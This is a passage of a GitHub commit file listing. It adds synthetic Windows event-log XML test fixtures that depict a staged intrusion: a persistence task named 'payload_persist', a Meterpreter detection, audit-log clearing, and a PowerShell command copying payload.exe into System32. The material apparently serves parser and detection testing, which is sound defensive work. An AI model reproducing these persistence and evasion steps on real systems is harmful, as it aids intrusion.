    {
      "sha": "ea2e63a2c018fb9624c56fe6d0300159139df286",
      "filename": "microsoft/tests/inputs/eid-0140.xml",
      "status": "added",
      "additions": 20,
      "deletions": 0,
      "changes": 20,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0140.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0140.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-0140.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,20 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-TaskScheduler\" Guid=\"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\"/>\n+    <EventID>140</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>30140</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"1032\" ThreadID=\"2048\"/>\n+    <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"TaskName\">\\Microsoft\\Windows\\UpdateOrchestrator\\payload_persist</Data>\n+    <Data Name=\"UserContext\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "a1c6f380ccefdd4207a0407842c5f10b93fc0131",
      "filename": "microsoft/tests/inputs/eid-0141.xml",
      "status": "added",
      "additions": 20,
      "deletions": 0,
      "changes": 20,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0141.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0141.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-0141.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,20 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-TaskScheduler\" Guid=\"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\"/>\n+    <EventID>141</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:35:01.000000000Z\"/>\n+    <EventRecordID>30141</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"1032\" ThreadID=\"2048\"/>\n+    <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"TaskName\">\\Microsoft\\Windows\\UpdateOrchestrator\\payload_persist</Data>\n+    <Data Name=\"UserContext\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "c171ec06f894d882e5f37c7fd04175e0a9075eb6",
      "filename": "microsoft/tests/inputs/eid-0200.xml",
      "status": "added",
      "additions": 22,
      "deletions": 0,
      "changes": 22,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0200.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0200.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-0200.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,22 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-TaskScheduler\" Guid=\"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\"/>\n+    <EventID>200</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>30200</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"1032\" ThreadID=\"2048\"/>\n+    <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"TaskName\">\\Microsoft\\Windows\\UpdateOrchestrator\\payload_persist</Data>\n+    <Data Name=\"TaskInstanceId\">{EC84F653-CA0D-4CD0-828E-FDE7D609F86C}</Data>\n+    <Data Name=\"ActionName\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"EnginePID\">1032</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "fe88c3e3b9791b5a839ced519283d5e18e6ccfc9",
      "filename": "microsoft/tests/inputs/eid-0201.xml",
      "status": "added",
      "additions": 22,
      "deletions": 0,
      "changes": 22,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0201.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-0201.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-0201.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,22 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-TaskScheduler\" Guid=\"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\"/>\n+    <EventID>201</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:58.123456700Z\"/>\n+    <EventRecordID>30201</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"1032\" ThreadID=\"2048\"/>\n+    <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"TaskName\">\\Microsoft\\Windows\\UpdateOrchestrator\\payload_persist</Data>\n+    <Data Name=\"TaskInstanceId\">{EC84F653-CA0D-4CD0-828E-FDE7D609F86C}</Data>\n+    <Data Name=\"ActionName\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"ResultCode\">0</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "cc2ca9522996008df4db6ffe6977ac04f6db7785",
      "filename": "microsoft/tests/inputs/eid-1006.xml",
      "status": "added",
      "additions": 30,
      "deletions": 0,
      "changes": 30,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1006.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1006.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1006.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,30 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>1006</EventID>\n+    <Version>0</Version>\n+    <Level>3</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>41006</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Threat Name\">Trojan:Win32/Meterpreter.A!MSR</Data>\n+    <Data Name=\"ID\">2147735503</Data>\n+    <Data Name=\"Severity\">Severe</Data>\n+    <Data Name=\"Category\">Trojan</Data>\n+    <Data Name=\"Path\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Detection Origin\">Local machine</Data>\n+    <Data Name=\"Detection Type\">Concrete</Data>\n+    <Data Name=\"Detection Source\">Real-time Protection</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Process Name\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Security intelligence Version\">1.405.12.0</Data>\n+    <Data Name=\"Engine Version\">1.1.24010.10</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "e4aeb14e800f016e00d4a37c6c6675a6f6f9f044",
      "filename": "microsoft/tests/inputs/eid-1007.xml",
      "status": "added",
      "additions": 26,
      "deletions": 0,
      "changes": 26,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1007.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1007.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1007.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,26 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>1007</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:58.123456700Z\"/>\n+    <EventRecordID>41007</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Threat Name\">Trojan:Win32/Meterpreter.A!MSR</Data>\n+    <Data Name=\"ID\">2147735503</Data>\n+    <Data Name=\"Severity\">Severe</Data>\n+    <Data Name=\"Category\">Trojan</Data>\n+    <Data Name=\"Action\">Quarantine</Data>\n+    <Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data>\n+    <Data Name=\"Security intelligence Version\">1.405.12.0</Data>\n+    <Data Name=\"Engine Version\">1.1.24010.10</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "85c549fe086adeca387973543831c8c4e99ef39e",
      "filename": "microsoft/tests/inputs/eid-1102.xml",
      "status": "added",
      "additions": 24,
      "deletions": 0,
      "changes": 24,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1102.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1102.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1102.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,24 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Eventlog\" Guid=\"{FC65DDD8-D6EF-4962-83D5-6E5CFE9CE148}\"/>\n+    <EventID>1102</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>104</Task>\n+    <Keywords>0x4020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>99001</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"ClientProcessId\">0x1234</Data>\n+    <Data Name=\"ClientProcessStartKey\">131972735680000000</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "3a0164c74135e79f85008ede0f9365b8c1fc8e4f",
      "filename": "microsoft/tests/inputs/eid-1116.xml",
      "status": "added",
      "additions": 52,
      "deletions": 0,
      "changes": 52,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1116.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1116.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1116.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,52 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>1116</EventID>\n+    <Version>0</Version>\n+    <Level>3</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>41116</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Product Name\">Windows Defender Antivirus</Data>\n+    <Data Name=\"Product Version\">4.18.24010.12</Data>\n+    <Data Name=\"Detection ID\">{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}</Data>\n+    <Data Name=\"Detection Time\">2024-03-23T12:34:56.789012300Z</Data>\n+    <Data Name=\"Unused\"></Data>\n+    <Data Name=\"Unused2\"></Data>\n+    <Data Name=\"Threat ID\">2147735503</Data>\n+    <Data Name=\"Threat Name\">Trojan:Win32/Meterpreter.A!MSR</Data>\n+    <Data Name=\"Severity ID\">5</Data>\n+    <Data Name=\"Severity Name\">Severe</Data>\n+    <Data Name=\"Category ID\">8</Data>\n+    <Data Name=\"Category Name\">Trojan</Data>\n+    <Data Name=\"FWLink\">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:Win32/Meterpreter.A!MSR&amp;threatid=2147735503</Data>\n+    <Data Name=\"Status Code\">1</Data>\n+    <Data Name=\"Status Description\"></Data>\n+    <Data Name=\"State\">1</Data>\n+    <Data Name=\"Source ID\">4</Data>\n+    <Data Name=\"Source Name\">Real-time Protection</Data>\n+    <Data Name=\"Process Name\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Detection User\">CORP\\jdoe</Data>\n+    <Data Name=\"Unused3\"></Data>\n+    <Data Name=\"Path\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Origin ID\">1</Data>\n+    <Data Name=\"Origin Name\">Local machine</Data>\n+    <Data Name=\"Execution ID\">1</Data>\n+    <Data Name=\"Execution Name\">Suspended</Data>\n+    <Data Name=\"Type ID\">0</Data>\n+    <Data Name=\"Type Name\">Concrete</Data>\n+    <Data Name=\"Pre Execution Status\">0</Data>\n+    <Data Name=\"Action ID\">9</Data>\n+    <Data Name=\"Action Name\">Not Applicable</Data>\n+    <Data Name=\"Remediation User\"></Data>\n+    <Data Name=\"Security intelligence Version\">1.405.12.0</Data>\n+    <Data Name=\"Engine Version\">1.1.24010.10</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "c70f6f3c516ed329119c35c5cd29104af8a082ad",
      "filename": "microsoft/tests/inputs/eid-1117.xml",
      "status": "added",
      "additions": 52,
      "deletions": 0,
      "changes": 52,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1117.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1117.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1117.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,52 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>1117</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:58.123456700Z\"/>\n+    <EventRecordID>41117</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Product Name\">Windows Defender Antivirus</Data>\n+    <Data Name=\"Product Version\">4.18.24010.12</Data>\n+    <Data Name=\"Detection ID\">{A1B2C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}</Data>\n+    <Data Name=\"Detection Time\">2024-03-23T12:34:56.789012300Z</Data>\n+    <Data Name=\"Unused\"></Data>\n+    <Data Name=\"Unused2\"></Data>\n+    <Data Name=\"Threat ID\">2147735503</Data>\n+    <Data Name=\"Threat Name\">Trojan:Win32/Meterpreter.A!MSR</Data>\n+    <Data Name=\"Severity ID\">5</Data>\n+    <Data Name=\"Severity Name\">Severe</Data>\n+    <Data Name=\"Category ID\">8</Data>\n+    <Data Name=\"Category Name\">Trojan</Data>\n+    <Data Name=\"FWLink\">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:Win32/Meterpreter.A!MSR&amp;threatid=2147735503</Data>\n+    <Data Name=\"Status Code\">1</Data>\n+    <Data Name=\"Status Description\"></Data>\n+    <Data Name=\"State\">2</Data>\n+    <Data Name=\"Source ID\">4</Data>\n+    <Data Name=\"Source Name\">Real-time Protection</Data>\n+    <Data Name=\"Process Name\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Detection User\">CORP\\jdoe</Data>\n+    <Data Name=\"Unused3\"></Data>\n+    <Data Name=\"Path\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Origin ID\">1</Data>\n+    <Data Name=\"Origin Name\">Local machine</Data>\n+    <Data Name=\"Execution ID\">1</Data>\n+    <Data Name=\"Execution Name\">Suspended</Data>\n+    <Data Name=\"Type ID\">0</Data>\n+    <Data Name=\"Type Name\">Concrete</Data>\n+    <Data Name=\"Pre Execution Status\">0</Data>\n+    <Data Name=\"Action ID\">2</Data>\n+    <Data Name=\"Action Name\">Quarantine</Data>\n+    <Data Name=\"Remediation User\">NT AUTHORITY\\SYSTEM</Data>\n+    <Data Name=\"Security intelligence Version\">1.405.12.0</Data>\n+    <Data Name=\"Engine Version\">1.1.24010.10</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "8a2c00a2074831fead0cf362237737e0f6141062",
      "filename": "microsoft/tests/inputs/eid-1121.xml",
      "status": "added",
      "additions": 28,
      "deletions": 0,
      "changes": 28,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1121.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-1121.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-1121.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,28 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>1121</EventID>\n+    <Version>0</Version>\n+    <Level>3</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>41121</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Company name\">Windows Defender Antivirus</Data>\n+    <Data Name=\"Process name\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Path\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Hashes\">SHA256=AABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Current Platform Version\">4.18.24010.12</Data>\n+    <Data Name=\"Threat Resource Path\">C:\\tmp\\payload.exe</Data>\n+    <Data Name=\"Threat Name\">Exploit:Win32/CVE-2024-99999</Data>\n+    <Data Name=\"Rule ID\">d4f940ab-401b-4efc-aadc-ad5f3c50688a</Data>\n+    <Data Name=\"Rule Name\">Block process creations originating from PSExec and WMI commands</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "50509bb2884ce0b3f1bdcf0dfd169b46153dfdfc",
      "filename": "microsoft/tests/inputs/eid-2000.xml",
      "status": "added",
      "additions": 28,
      "deletions": 0,
      "changes": 28,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-2000.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-2000.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-2000.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,28 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>2000</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:35:01.000000000Z\"/>\n+    <EventRecordID>42000</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Current Signature Version\">1.405.12.0</Data>\n+    <Data Name=\"Previous Signature Version\">1.405.11.0</Data>\n+    <Data Name=\"Update Source\">Microsoft Malware Protection Center</Data>\n+    <Data Name=\"Update Stage\">Install</Data>\n+    <Data Name=\"Source Path\">https://go.microsoft.com/fwlink/?linkid=74005</Data>\n+    <Data Name=\"Signature Type\">AntiVirus</Data>\n+    <Data Name=\"Update Type\">Full</Data>\n+    <Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data>\n+    <Data Name=\"Current Engine Version\">1.1.24010.10</Data>\n+    <Data Name=\"Previous Engine Version\">1.1.24010.10</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "d38b8591cd0c7f10ac1b701acde31412d0735d72",
      "filename": "microsoft/tests/inputs/eid-4100.xml",
      "status": "added",
      "additions": 34,
      "deletions": 0,
      "changes": 34,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4100.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4100.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4100.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,34 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\"/>\n+    <EventID>4100</EventID>\n+    <Version>1</Version>\n+    <Level>3</Level>\n+    <Task>1</Task>\n+    <Keywords>0x0</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>20100</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"6812\" ThreadID=\"7120\"/>\n+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"ErrorCode\">-2146233087</Data>\n+    <Data Name=\"Message\">Access to the path 'C:\\Windows\\System32\\payload.exe' is denied.</Data>\n+    <Data Name=\"Severity\">Error</Data>\n+    <Data Name=\"HostName\">ConsoleHost</Data>\n+    <Data Name=\"HostVersion\">5.1.19041.4648</Data>\n+    <Data Name=\"HostId\">{{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}</Data>\n+    <Data Name=\"HostApplication\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\n+    <Data Name=\"EngineVersion\">5.1.19041.4648</Data>\n+    <Data Name=\"RunspaceId\">{{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}</Data>\n+    <Data Name=\"PipelineId\">2</Data>\n+    <Data Name=\"ScriptName\"></Data>\n+    <Data Name=\"CommandLine\">Copy-Item -Path C:\\tmp\\payload.exe -Destination C:\\Windows\\System32\\</Data>\n+    <Data Name=\"CommandInvocation\">Copy-Item</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"ConnectedUser\"></Data>\n+    <Data Name=\"ShellId\">Microsoft.PowerShell</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "4277b563817eaf30ba89165a9572301086310cce",
      "filename": "microsoft/tests/inputs/eid-4103.xml",
      "status": "added",
      "additions": 36,
      "deletions": 0,
      "changes": 36,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4103.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4103.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4103.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,36 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\"/>\n+    <EventID>4103</EventID>\n+    <Version>1</Version>\n+    <Level>4</Level>\n+    <Task>1</Task>\n+    <Keywords>0x0</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>20103</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"6812\" ThreadID=\"7120\"/>\n+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"ContextInfo\">        Severity = Informational\n+        Host Name = ConsoleHost\n+        Host Version = 5.1.19041.4648\n+        Host ID = {{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}\n+        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n+        Engine Version = 5.1.19041.4648\n+        Runspace ID = {{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}\n+        Pipeline ID = 3\n+        Command Name = Invoke-Expression\n+        Command Type = Cmdlet\n+        Script Name =\n+        Command Path =\n+        Sequence Number = 15\n+        User = CORP\\jdoe\n+        Connected User =\n+        Shell ID = Microsoft.PowerShell</Data>\n+    <Data 